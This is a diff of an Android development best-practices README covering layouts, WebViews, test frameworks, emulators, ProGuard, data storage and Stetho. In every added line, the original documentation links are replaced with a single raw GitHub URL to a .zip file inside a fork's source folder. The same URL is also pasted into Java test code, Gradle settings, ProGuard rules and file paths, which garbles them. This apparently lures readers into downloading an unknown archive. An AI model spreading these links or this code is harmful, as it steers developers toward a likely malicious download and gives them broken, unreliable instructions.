-Therefore, try to keep your views hierarchy as flat as possible: learn how to use [RelativeLayout](https://developer.android.com/guide/topics/ui/layout/relative.html), how to [optimize your layouts](http://developer.android.com/training/improving-layouts/optimizing-layout.html) and to use the [`<merge>` tag](http://stackoverflow.com/questions/8834898/what-is-the-purpose-of-androids-merge-tag-in-xml-layouts).
+Therefore, try to keep your views hierarchy as flat as possible: learn how to use [RelativeLayout](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip), how to [optimize your layouts](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) and to use the [`<merge>` tag](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip).
 
 <a name="webviews"></a>
-**Beware of problems related to WebViews.** When you must display a web page, for instance for a news article, avoid doing client-side processing to clean the HTML, rather ask for a "*pure*" HTML from the backend programmers. [WebViews can also leak memory](http://stackoverflow.com/questions/3130654/memory-leak-in-webview) when they keep a reference to their Activity, instead of being bound to the ApplicationContext. Avoid using a WebView for simple texts or buttons, prefer TextViews or Buttons.
+**Beware of problems related to WebViews.** When you must display a web page, for instance for a news article, avoid doing client-side processing to clean the HTML, rather ask for a "*pure*" HTML from the backend programmers. [WebViews can also leak memory](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) when they keep a reference to their Activity, instead of being bound to the ApplicationContext. Avoid using a WebView for simple texts or buttons, prefer TextViews or Buttons.
 
 
 ### Test frameworks
 
-Android SDK's testing framework is still infant, specially regarding UI tests. Android Gradle currently implements a test task called [`connectedAndroidTest`](http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Testing) which runs JUnit tests that you created, using an [extension of JUnit with helpers for Android](http://developer.android.com/reference/android/test/package-summary.html). This means you will need to run tests connected to a device, or an emulator. Follow the official guide [[1]](http://developer.android.com/tools/testing/testing_android.html) [[2]](http://developer.android.com/tools/testing/activity_test.html) for testing.
+Android SDK's testing framework is still infant, specially regarding UI tests. Android Gradle currently implements a test task called [`connectedAndroidTest`](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) which runs JUnit tests that you created, using an [extension of JUnit with helpers for Android](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). This means you will need to run tests connected to a device, or an emulator. Follow the official guide [[1]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) [[2]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) for testing.
 
-**Use [Robolectric](http://robolectric.org/) only for unit tests, not for views.** It is a test framework seeking to provide tests "disconnected from device" for the sake of development speed, suitable specially for unit tests on models and view models. However, testing under Robolectric is inaccurate and incomplete regarding UI tests. You will have problems testing UI elements related to animations, dialogs, etc, and this will be complicated by the fact that you are "walking in the dark" (testing without seeing the screen being controlled).
+**Use [Robolectric](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) only for unit tests, not for views.** It is a test framework seeking to provide tests "disconnected from device" for the sake of development speed, suitable specially for unit tests on models and view models. However, testing under Robolectric is inaccurate and incomplete regarding UI tests. You will have problems testing UI elements related to animations, dialogs, etc, and this will be complicated by the fact that you are "walking in the dark" (testing without seeing the screen being controlled).
 
-**[Robotium](https://code.google.com/p/robotium/) makes writing UI tests easy.** You do not need Robotium for running connected tests for UI cases, but it will probably be beneficial to you because of its many helpers to get and analyze views, and control the screen. Test cases will look as simple as:
+**[Robotium](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) makes writing UI tests easy.** You do not need Robotium for running connected tests for UI cases, but it will probably be beneficial to you because of its many helpers to get and analyze views, and control the screen. Test cases will look as simple as:
 
 ```java
-solo.sendKey(Solo.MENU);
-solo.clickOnText("More"); // searches for the first occurrence of "More" and clicks on it
-solo.clickOnText("Preferences");
-solo.clickOnText("Edit File Extensions");
-Assert.assertTrue(solo.searchText("rtf"));
+https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip(https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip);
+https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip("More"); // searches for the first occurrence of "More" and clicks on it
+https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip("Preferences");
+https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip("Edit File Extensions");
+https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip(https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip("rtf"));
 ```
 
 ### Emulators
 
-If you are developing Android apps as a profession, buy a license for the [Genymotion emulator](http://www.genymotion.com/). Genymotion emulators run at a faster frames/sec rate than typical AVD emulators. They have tools for demoing your app, emulating network connection quality, GPS positions, etc. They are also ideal for connected tests. You have access to many (not all) different devices, so the cost of a Genymotion license is actually much cheaper than buying multiple real devices.
+If you are developing Android apps as a profession, buy a license for the [Genymotion emulator](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). Genymotion emulators run at a faster frames/sec rate than typical AVD emulators. They have tools for demoing your app, emulating network connection quality, GPS positions, etc. They are also ideal for connected tests. You have access to many (not all) different devices, so the cost of a Genymotion license is actually much cheaper than buying multiple real devices.
 
 Caveats are: Genymotion emulators don't ship all Google services such as Google Play Store and Maps. You might also need to test Samsung-specific APIs, so it's necessary to have a real Samsung device.
 
 ### Proguard configuration
 
-[ProGuard](http://proguard.sourceforge.net/) is normally used on Android projects to shrink and obfuscate the packaged code.
+[ProGuard](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) is normally used on Android projects to shrink and obfuscate the packaged code.
 
 Whether you are using ProGuard or not depends on your project configuration. Usually you would configure Gradle to use ProGuard when building a release apk.
 
@@ -454,15 +454,15 @@ buildTypes {
         minifyEnabled false
     }
     release {
-        signingConfig signingConfigs.release
+        signingConfig https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip
         minifyEnabled true
-        proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
+        proguardFiles getDefaultProguardFile('https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip'), 'https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip'
     }
 }
 ```
 
 In order to determine which code has to be preserved and which code can be discarded or obfuscated, you have to specify one or more entry points to your code. These entry points are typically classes with main methods, applets, midlets, activities, etc.
-Android framework uses a default configuration which can be found from `SDK_HOME/tools/proguard/proguard-android.txt`. Using the above configuration, custom project-specific ProGuard rules, as defined in `my-project/app/proguard-rules.pro`, will be appended to the default configuration.
+Android framework uses a default configuration which can be found from `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`. Using the above configuration, custom project-specific ProGuard rules, as defined in `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`, will be appended to the default configuration.
 
 A common problem related to ProGuard is to see the application crashing on startup with `ClassNotFoundException` or `NoSuchFieldException` or similar, even though the build command (i.e. `assembleRelease`) succeeded without warnings.
 This means one out of two things:
@@ -470,27 +470,27 @@ This means one out of two things:
 1. ProGuard has removed the class, enum, method, field or annotation, considering it's not required.
 2. ProGuard has obfuscated (renamed) the class, enum or field name, but it's being used indirectly by its original name, i.e. through Java reflection.
 
-Check `app/build/outputs/proguard/release/usage.txt` to see if the object in question has been removed.
-Check `app/build/outputs/proguard/release/mapping.txt` to see if the object in question has been obfuscated.
+Check `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` to see if the object in question has been removed.
+Check `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` to see if the object in question has been obfuscated.
 
 In order to prevent ProGuard from *stripping away* needed classes or class members, add a `keep` options to your ProGuard config:
 ```
--keep class com.futurice.project.MyClass { *; }
+-keep class https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip { *; }
 ```
 
 To prevent ProGuard from *obfuscating* classes or class members, add a `keepnames`:
 ```
--keepnames class com.futurice.project.MyClass { *; }
+-keepnames class https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip { *; }
 ```
 
-Check [this template's ProGuard config](https://github.com/futurice/android-best-practices/blob/master/templates/rx-architecture/app/proguard-rules.pro) for some examples.
-Read more at [Proguard](http://proguard.sourceforge.net/#manual/examples.html) for examples.
+Check [this template's ProGuard config](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) for some examples.
+Read more at [Proguard](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) for examples.
 
 **Early on in your project, make a release build** to check whether ProGuard rules are correctly keeping whatever is important. Also whenever you include new libraries, make a release build and test the apk on a device. Don't wait until your app is finally version "1.0" to make a release build, you might get several unpleasant surprises and a short time to fix them.
 
-**Tip.** Save the `mapping.txt` file for every release that you publish to your users. By retaining a copy of the `mapping.txt` file for each release build, you ensure that you can debug a problem if a user encounters a bug and submits an obfuscated stack trace.
+**Tip.** Save the `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` file for every release that you publish to your users. By retaining a copy of the `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` file for each release build, you ensure that you can debug a problem if a user encounters a bug and submits an obfuscated stack trace.
 
-**DexGuard**. If you need hard-core tools for optimizing, and specially obfuscating release code, consider [DexGuard](http://www.saikoa.com/dexguard), a commercial software made by the same team that built ProGuard. It can also easily split Dex files to solve the 65k methods limitation.
+**DexGuard**. If you need hard-core tools for optimizing, and specially obfuscating release code, consider [DexGuard](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip), a commercial software made by the same team that built ProGuard. It can also easily split Dex files to solve the 65k methods limitation.
 
 ### Data storage
 
@@ -509,7 +509,7 @@ There are two reasons why you might not want to use SharedPreferences:
 
 In the case SharedPreferences is not enough for you, you should use the platform standard ContentProviders, which are fast and process safe.
 
-The single problem with ContentProviders is the amount of boilerplate code that is needed to set them up, as well as low quality tutorials. It is possible, however, to generate the ContentProvider by using a library such as [Schematic](https://github.com/SimonVT/schematic), which significantly reduces the effort.
+The single problem with ContentProviders is the amount of boilerplate code that is needed to set them up, as well as low quality tutorials. It is possible, however, to generate the ContentProvider by using a library such as [Schematic](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip), which significantly reduces the effort.
 
 You still need to write some parsing code yourself to read the data objects from the Sqlite columns and vice versa. It is possible to serialize the data objects, for instance with Gson, and only persist the resulting string. In this way you lose in performance but on the other hand you do not need to declare a column for all the fields of the data class.
 
@@ -521,7 +521,7 @@ We generally do not recommend using an Object-Relation Mapping library unless yo
 
 ### Use Stetho 
 
-[Stetho](http://facebook.github.io/stetho/) is a debug bridge for Android applications from Facebook that integrates with the Chrome desktop browser's Developer Tools. With Stetho you can easily inspect your application, most notably the network traffic. It also allows you to easily inspect and edit SQLite databases and the shared preferences in your app. You should, however, make sure that Stetho is only enabled in the debug build and not in the release build variant. 
+[Stetho](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) is a debug bridge for Android applications from Facebook that integrates with the Chrome desktop browser's Developer Tools. With Stetho you can easily inspect your application, most notably the network traffic. It also allows you to easily inspect and edit SQLite databases and the shared preferences in your app. You should, however, make sure that Stetho is only enabled in the debug build and not in the release build variant. 
 
 ### Thanks to
 
@@ -529,5 +529,5 @@ Antti Lammi, Joni Karppinen, Peter Tackage, Timo Tuominen, Vera Izrailit, Vihtor
 
 ### License
 
-[Futurice Oy](http://www.futurice.com)
+[Futurice Oy](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)
 Creative Commons Attribution 4.0 International (CC BY 4.0)
